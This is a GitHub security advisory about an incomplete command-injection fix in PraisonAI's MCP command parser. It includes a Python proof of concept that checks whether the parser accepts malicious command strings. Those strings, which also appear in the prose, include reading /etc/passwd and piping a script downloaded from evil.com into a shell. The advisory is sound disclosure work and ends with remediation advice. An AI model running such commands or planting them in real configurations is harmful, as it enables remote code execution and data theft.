# [C] PraisonAI has an incomplete fix for CVE-2026-34935 - OS Command Injection 

## Summary
Severity: Critical
Advisory: GHSA-9qhq-v63v-fv3j
CVE: CVE-2026-41497
CWE: CWE-77, CWE-78
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-17
Source: https://github.com/advisories/GHSA-9qhq-v63v-fv3j
Type: github-advisory

## Affected
- PyPI: `praisonai` — affected >=0 <4.5.149

## Details
### Summary

The fix for PraisonAI's MCP command handling does not add a command allowlist or argument validation to `parse_mcp_command()`, allowing arbitrary executables like `bash`, `python`, or `/bin/sh` with inline code execution flags to pass through to subprocess execution.

### Affected Package

- **Ecosystem:** PyPI
- **Package:** MervinPraison/PraisonAI
- **Affected versions:** < 47bff65413be
- **Patched versions:** >= 47bff65413be

### Details

The vulnerability exists in `src/praisonai/praisonai/cli/features/mcp.py` in the `MCPHandler.parse_mcp_command()` method. This function parses MCP server command strings into executable commands, arguments, and environment variables. The pre-patch version performs no validation on the executable or arguments.

The fix commit `47bff654` was intended to address command injection, but the patched `parse_mcp_command()` still lacks three critical controls: there is no `ALLOWED_COMMANDS` allowlist of permitted executables (e.g., `npx`, `uvx`, `node`, `python`), there is no `os.path.basename()` validation to prevent path-based executable injection, and there is no argument inspection to block shell metacharacters or dangerous subcommands.

Malicious MCP server commands such as `python -c 'import os; os.system("id")'`, `bash -c 'cat /etc/passwd'`, and `/bin/sh -c 'wget http://evil.com/shell.sh | sh'` are all accepted by `parse_mcp_command()` and passed directly to subprocess execution without filtering.

### PoC

```python
#!/usr/bin/env python3
"""
CVE-2026-34935 - PraisonAI command injection via parse_mcp_command()

Tests against REAL PraisonAI mcp.py from git at commit 66bd9ee2 (parent of fix 47bff654).
The pre-patch parse_mcp_command() performs NO validation on the executable or
arguments, allowing arbitrary command execution via MCP server commands.

Repo: https://github.com/MervinPraison/PraisonAI
Patch commit: 47bff65413beaa3c21bf633c1fae4e684348368c
"""

import sys
import os
import importlib.util

# Load the REAL mcp.py from the cloned PraisonAI repo at vulnerable commit
MCP_PATH = "/tmp/praisonai_real/src/praisonai/praisonai/cli/features/mcp.py"

def load_mcp_handler():
    """Load the real MCPHandler class from the vulnerable source."""
    base_path = "/tmp/praisonai_real/src/praisonai/praisonai/cli/features/base.py"

    spec_base = importlib.util.spec_from_file_location("features_base", base_path)
    mod_base = importlib.util.module_from_spec(spec_base)
    sys.modules["features_base"] = mod_base

    with open(MCP_PATH) as f:
        source = f.read()

    source = source.replace("from .base import FlagHandler", """
class FlagHandler:
    def print_status(self, msg, level="info"):
        print(f"[{level}] {msg}")
""")

    ns = {"__name__": "mcp_module", "__file__": MCP_PATH}
    exec(compile(source, MCP_PATH, "exec"), ns)
    return ns["MCPHandler"]


def main():
    MCPHandler = load_mcp_handler()
    handler = MCPHandler()

    print(f"Source file: {MCP_PATH}")
    print(f"Loaded MCPHandler from real PraisonAI source")
    print()

    malicious_commands = [
        "python -c 'import os; os.system(\"id\")'",
        "node -e 'require(\"child_process\").execSync(\"whoami\")'",
        "bash -c 'cat /etc/passwd'",
        "/bin/sh -c 'wget http://evil.com/shell.sh | sh'",
    ]

    print("Testing parse_mcp_command with malicious inputs:")
    print()

    all_accepted = True
    for cmd_str in malicious_commands:
        try:
            cmd, args, env = handler.parse_mcp_command(cmd_str)
            print(f"  Input:   {cmd_str}")
            print(f"  Command: {cmd}")
            print(f"  Args:    {args}")
            print(f"  Result:  ACCEPTED (no validation)")
            print()
        except Exception as e:
            print(f"  Input:   {cmd_str}")
            print(f"  Result:  REJECTED ({e})")
            all_accepted = False
            print()

    if all_accepted:
        print("ALL malicious commands accepted without validation!")
        print()

        with open(MCP_PATH) as f:
            source = f.read()

        has_allowlist = "ALLOWED_COMMANDS" in source or "allowlist" in source.lower()
        has_basename_check = "os.path.basename" in source
        has_validation = has_allowlist or has_basename_check

        print(f"Has command allowlist: {has_allowlist}")
        print(f"Has basename check: {has_basename_check}")
        print(f"Has any command validation: {has_validation}")
        print()

        if not has_validation:
            print("COMMAND INJECTION: parse_mcp_command() has NO command validation!")
            print("  - No allowlist of permitted executables")
            print("  - No argument inspection")
            print("  - Arbitrary commands passed directly to subprocess execution")
            print()
            print("VULNERABILITY CONFIRMED")
            sys.exit(0)

    print("Some commands were rejected - validation present")
    sys.exit(1)


if __name__ == "__main__":
    main()
```

**Steps to reproduce:**
1. `git clone https://github.com/MervinPraison/PraisonAI /tmp/praisonai_real`
2. `cd /tmp/praisonai_real && git checkout 47bff654~1`
3. `python3 poc.py`

**Expected output:**
```
VULNERABILITY CONFIRMED
parse_mcp_command() has NO command validation; arbitrary commands passed directly to subprocess execution without an allowlist.
```

### Impact

An attacker who can influence MCP server configuration (e.g., via a malicious plugin or shared configuration file) can execute arbitrary system commands on the host running PraisonAI, enabling full remote code execution, data exfiltration, and lateral movement.

### Suggested Remediation

Implement a strict allowlist of permitted executables (e.g., `npx`, `uvx`, `node`, `python`) in `parse_mcp_command()`. Validate commands against `os.path.basename()` to prevent absolute path injection. Inspect arguments for shell metacharacters and dangerous subcommand patterns (e.g., `-c`, `-e` flags enabling inline code execution).

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-9qhq-v63v-fv3j
- https://nvd.nist.gov/vuln/detail/CVE-2026-34935
- https://nvd.nist.gov/vuln/detail/CVE-2026-41497
- https://github.com/MervinPraison/PraisonAI/commit/47bff65413beaa3c21bf633c1fae4e684348368c
- https://github.com/MervinPraison/PraisonAI
